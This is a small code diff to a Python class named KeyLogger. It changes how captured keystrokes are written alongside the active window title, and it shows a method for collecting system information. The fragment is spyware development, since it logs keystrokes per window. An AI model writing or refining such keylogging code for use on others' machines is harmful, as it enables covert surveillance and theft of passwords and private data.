@@ -43,7 +43,7 @@ class KeyLogger:
                 key_str = "\t"
             
             # Log the key with the window title
-            f.write(f"{current_window} - {key_str}\n")
+            f.write(f"{current_window} - ({key_str})\n")
 
     def get_computer_information(self):
         """Collect and log system information"""
